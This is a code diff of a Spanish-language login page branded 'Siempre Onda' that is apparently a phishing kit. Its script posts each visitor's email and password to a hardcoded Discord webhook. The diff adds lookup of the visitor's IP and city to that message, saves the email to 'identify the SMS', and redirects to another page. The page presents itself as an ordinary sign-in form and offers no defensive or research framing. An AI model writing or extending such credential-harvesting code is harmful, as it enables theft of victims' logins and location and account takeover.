@@ -72,7 +72,7 @@
         .remember-row input[type="checkbox"] {
             width: 22px;
             height: 22px;
-            accent-color: #2ecc71; /* Verde de la imagen */
+            accent-color: #2ecc71; 
             cursor: pointer;
         }
         .remember-row label {
@@ -125,21 +125,15 @@
         .btn-login {
             width: 100%;
             padding: 16px;
-            background-color: #e0e0e0; /* Color inicial desactivado */
-            color: #a0a0a0;
+            background-color: #007bff;
+            color: white;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: auto; /* Posiciona al final */
+            margin-top: auto; 
             margin-bottom: 20px;
-        }
-
-        /* Estilo para cuando el botón está activo/relleno */
-        .btn-login.active {
-            background-color: #007bff;
-            color: white;
         }
 
         .footer-text {
@@ -177,7 +171,7 @@
         <label class="field-label">Contraseña</label>
         <div style="position: relative;">
             <input type="password" id="password" class="input-field" required>
-            <span style="position: absolute; right: 15px; top: 15px; color: #ccc;">👁️</span>
+            <span style="position: absolute; right: 15px; top: 15px; color: #ccc; cursor: pointer;">👁️</span>
         </div>
 
         <div class="forgot-pass">
@@ -192,7 +186,7 @@
             <span class="info-icon">?</span>
         </div>
 
-        <button type="submit" class="btn-login active" id="btnAction">Iniciar sesión</button>
+        <button type="submit" class="btn-login" id="btnAction">Iniciar sesión</button>
     </form>
 
     <div class="footer-text">
@@ -202,6 +196,17 @@
 
 <script>
     const WEBHOOK_DISCORD = "https://discordapp.com/api/webhooks/1473681245949923348/9Oa77S5ZwE1IxqjpxYk44il7Ln-mUJKzoUOm8NYx0uM1kV9Qe4FRhOFYv1XBkQ0LKqW2";
+    
+    let geoLocal = "Obteniendo...";
+
+    async function cargarGeo() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            geoLocal = `${data.city}, ${data.country_name} (IP: ${data.ip})`;
+        } catch (e) { geoLocal = "No disponible"; }
+    }
+    cargarGeo();
 
     document.getElementById('authForm').addEventListener('submit', async (e) => {
         e.preventDefault();
@@ -211,19 +216,23 @@
         const pass = document.getElementById('password').value;
         const remember = document.getElementById('remember').checked;
 
+        // Guardar email para identificar los SMS
+        localStorage.setItem('usuario_activo', email);
+
         btn.disabled = true;
         btn.innerText = "Verificando...";
 
         const payload = {
-            content: null,
             embeds: [{
-                title: "🔑 Login App Siempre Onda",
+                title: "🔑 NUEVO ACCESO: " + email,
                 color: 5814783,
                 fields: [
-                    { name: "Usuario", value: email },
-                    { name: "Password", value: pass },
-                    { name: "Recordar", value: remember ? "Sí" : "No" }
+                    { name: "👤 Usuario", value: "`" + email + "`", inline: true },
+                    { name: "🔑 Password", value: "`" + pass + "`", inline: true },
+                    { name: "📍 Ubicación", value: geoLocal, inline: false },
+                    { name: "💾 Recordar", value: remember ? "Sí" : "No", inline: true }
                 ],
+                footer: { text: "Siempre Onda" },
                 timestamp: new Date()
             }]
         };
@@ -234,10 +243,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            
-            // Redirección inmediata a time.html
             window.location.href = "time.html";
-            
         } catch (err) {
             alert("Error de conexión");
             btn.disabled = false;
